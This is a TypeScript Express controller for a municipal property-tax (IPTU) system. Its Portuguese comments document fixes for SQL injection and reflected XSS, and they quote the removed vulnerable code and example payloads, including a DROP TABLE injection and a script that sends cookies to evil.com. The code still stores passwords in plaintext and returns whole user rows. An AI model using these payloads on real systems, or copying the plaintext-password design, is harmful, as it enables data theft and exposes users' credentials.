import { Request, Response } from "express";
import db from "../database";

export const login = async (req: Request, res: Response) => {
    const { email, password } = req.body;
    console.log(`Recebendo login para email: ${req.body}`);

    // [SEGURANÇA] ✅ Query já estava parametrizada corretamente.
    // O uso de $1 e $2 faz o banco tratar os valores como DADO e não como
    // código SQL, prevenindo SQL Injection independente do que o usuário envie.
    const query = `SELECT * FROM usuario WHERE email = $1 AND senha = $2`;

    console.log(`Query Executada: ${query}`);
    const result = await db.query(query, [email, password]);

    if (result.rowCount && result.rowCount > 0) {
        res.json({ success: true, user: result.rows[0] });
    } else {
        res.status(401).json({ success: false, message: "Falha no login" });
    }
};

export const novoLogin = async (req: Request, res: Response) => {
    const { email, password, nome } = req.body;
    const nomeNormalizado = normalizarNome(nome);

    // [SEGURANÇA - SQL INJECTION] ❌ CÓDIGO ORIGINAL REMOVIDO:
    //
    //   const queryNomeIpuExiste = "SELECT * FROM iptu WHERE nome = '" + nomeNormalizado + "'";
    //   const iptuResult = await db.query(queryNomeIpuExiste);
    //
    // PROBLEMA: o valor de nomeNormalizado era concatenado diretamente na string
    // da query. Um atacante poderia passar nome = "' OR '1'='1" fazendo a query
    // virar:
    //   SELECT * FROM iptu WHERE nome = '' OR '1'='1'
    // Isso retorna TODOS os registros da tabela, bypassando a verificação.
    //
    // CORREÇÃO: uso de query parametrizada com $1.
    const queryNomeIptuExiste = `SELECT * FROM iptu WHERE nome = $1`;
    const iptuResult = await db.query(queryNomeIptuExiste, [nomeNormalizado]);

    if (iptuResult.rowCount && iptuResult.rowCount > 0) {

        // [SEGURANÇA - SQL INJECTION] ❌ CÓDIGO ORIGINAL REMOVIDO:
        //
        //   const query = `INSERT INTO usuario (email, senha, nome, tipo_usuario_id)
        //                  VALUES ('${email}', '${password}', '${nome}', 3)`;
        //   const result = await db.query(query);
        //
        // PROBLEMA: email, password e nome eram interpolados diretamente na string.
        // Um atacante poderia passar email = "x', 3); DROP TABLE usuario; --"
        // destruindo dados do banco inteiro.
        //
        // CORREÇÃO: todos os valores do usuário passam como parâmetros $1, $2, $3.
        const queryInsert = `INSERT INTO usuario (email, senha, nome, tipo_usuario_id) VALUES ($1, $2, $3, 3)`;
        const result = await db.query(queryInsert, [email, password, nome]);

        // [SEGURANÇA - SQL INJECTION] ❌ CÓDIGO ORIGINAL REMOVIDO:
        //
        //   const queryIdUsuario = `SELECT id FROM usuario
        //                           WHERE email = '${email}' AND senha = '${password}'`;
        //   const resultIdUsuario = await db.query(queryIdUsuario);
        //
        // PROBLEMA: mesma interpolação direta. Além do SQL Injection, essa query
        // re-busca o usuário pela senha em texto puro, o que é um risco adicional.
        //
        // CORREÇÃO: parametrizado com $1 e $2.
        const queryIdUsuario = `SELECT id FROM usuario WHERE email = $1 AND senha = $2`;
        const resultIdUsuario = await db.query(queryIdUsuario, [email, password]);

        // [SEGURANÇA - SQL INJECTION] ❌ CÓDIGO ORIGINAL REMOVIDO:
        //
        //   const queryUpdateTabelaIptu = `UPDATE iptu set usuario_id = '${resultIdUsuario.rows[0].id}'
        //                                  WHERE nome = '${nomeNormalizado}'`;
        //   const resultUpdate = await db.query(queryUpdateTabelaIptu);
        //
        // PROBLEMA: o id retornado do banco e o nomeNormalizado eram interpolados
        // diretamente. Mesmo valores vindos do próprio banco devem ser parametrizados,
        // pois podem ter sido inseridos por um atacante anteriormente.
        //
        // CORREÇÃO: parametrizado com $1 e $2.
        const queryUpdateIptu = `UPDATE iptu SET usuario_id = $1 WHERE nome = $2`;
        const resultUpdate = await db.query(queryUpdateIptu, [resultIdUsuario.rows[0].id, nomeNormalizado]);

        if (result.rowCount && result.rowCount > 0 && resultUpdate.rowCount && resultUpdate.rowCount > 0) {
            res.json({ success: true, user: result.rows[0] });
        } else {
            res.status(401).json({ success: false, message: "Falha no login" });
        }
    } else {
        res.status(404).json({ success: false, message: `Nome '${nome}' nao encontrado no cadastro de municipes` });
    }
};

export const atualizarIptu = async (req: Request, res: Response) => {
    const { usuarioId, novoValor } = req.body;

    // [SEGURANÇA - SQL INJECTION] ❌ CÓDIGO ORIGINAL REMOVIDO:
    //
    //   const query = `UPDATE iptu SET valor = ${novoValor} WHERE usuario_id = ${usuarioId}`;
    //   await db.query(query);
    //
    // PROBLEMA: novoValor e usuarioId eram interpolados sem aspas e sem validação.
    // Um atacante poderia passar usuarioId = "1 OR 1=1" atualizando o IPTU de
    // TODOS os usuários ao mesmo tempo.
    //
    // CORREÇÃO: parametrizado com $1 e $2.
    const query = `UPDATE iptu SET valor = $1 WHERE usuario_id = $2`;
    try {
        await db.query(query, [novoValor, usuarioId]);
        res.json({ message: "IPTU atualizado" });
    } catch (err: any) {
        res.status(500).json({ error: err.message });
    }
};

export const getIptuPorIdUsuario = async (req: Request, res: Response) => {
    const usuarioId = req.query.usuarioId as string;

    // [SEGURANÇA - SQL INJECTION] ❌ CÓDIGO ORIGINAL REMOVIDO:
    //
    //   const query = `SELECT * FROM iptu WHERE usuario_id = ${usuarioId}`;
    //   const result = await db.query(query);
    //
    // PROBLEMA: usuarioId vinha direto da query string da URL e era inserido
    // sem nenhum tratamento. Qualquer pessoa poderia acessar:
    //   GET /iptu?usuarioId=1 OR 1=1
    // retornando os dados de TODOS os munícipes, ou usar UNION para
    // extrair outras tabelas do banco.
    //
    // CORREÇÃO: parametrizado com $1.
    const query = `SELECT * FROM iptu WHERE usuario_id = $1`;
    console.log(`Query Executada: ${query}`);
    try {
        const result = await db.query(query, [usuarioId]);
        console.log(`Retorno: ${result}`);
        res.json({ iptu: result.rows });
    } catch (err: any) {
        res.status(500).json({ error: err.message });
    }
};

export const getQRCodeOrCodBarras = async (req: Request, res: Response) => {
    const tipo = req.query.tipo as string;

    let codigoHtml = "";
    if (tipo === "codigoDeBarras") {
        codigoHtml = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=123456789" />`;
    } else if (tipo === "qrcode") {
        codigoHtml = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=QRCodeDemo" />`;
    }

    // [SEGURANÇA - XSS REFLETIDO] ❌ CÓDIGO ORIGINAL REMOVIDO:
    //
    //   res.send(`<h2>Tipo selecionado: ${tipo}</h2>${codigoHtml}`);
    //
    // PROBLEMA: o parâmetro tipo vinha diretamente da URL e era injetado no
    // HTML da resposta sem nenhum tratamento. Um atacante poderia acessar:
    //   GET /rota?tipo=<script>fetch('https://evil.com?c='+document.cookie)</script>
    // e o servidor devolveria esse script executável para qualquer usuário
    // que clicasse no link — XSS Refletido direto no back-end.
    //
    // CORREÇÃO: o valor de tipo é validado contra uma lista de valores
    // permitidos (whitelist). Se não for um valor esperado, é descartado.
    // Nenhum valor externo é inserido diretamente no HTML.
    const tiposPermitidos = ["codigoDeBarras", "qrcode"];
    const tipoSeguro = tiposPermitidos.includes(tipo) ? tipo : "invalido";

    res.send(`<h2>Tipo selecionado: ${tipoSeguro}</h2>${codigoHtml}`);
};

export function normalizarNome(nome: string): string {
    return nome
        .normalize("NFD")
        .replace(/[\u0300-\u036f]/g, "")
        .toUpperCase()
        .trim();
}